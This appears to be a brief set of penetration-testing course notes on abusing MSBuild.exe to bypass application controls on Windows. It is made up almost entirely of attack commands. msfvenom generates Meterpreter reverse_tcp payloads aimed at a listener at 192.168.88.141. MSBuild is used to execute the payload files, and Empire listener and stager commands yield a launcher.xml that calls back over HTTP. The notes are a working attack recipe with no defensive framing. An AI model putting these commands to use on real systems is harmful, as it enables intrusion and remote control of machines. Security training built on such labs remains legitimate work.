# MSBuild

## Find it 
dir /b /s C:\msbuild.exe 

## POC 
console.writeline("get pwned!");
C:\windows\microsoft.nete\framework64\v4.0.30319\msbuild.exe C:\coursefiles\pwnedtxt.xml

## Execute (32 bit)
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.88.141 lport=8080 -f csharp > build.xml 
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\payload.xml 

## Execute (64 bit) 
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.88.141 lport=8081 -f csharp > build.xml 

## Empire 
uselistener http
set Host http://192.168.88.141:8001
set Port 8001
execute 
back 
usestager windows/launcher.xml
set Listener http
execute 
dowload file 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\CourseFiles\launcher.xml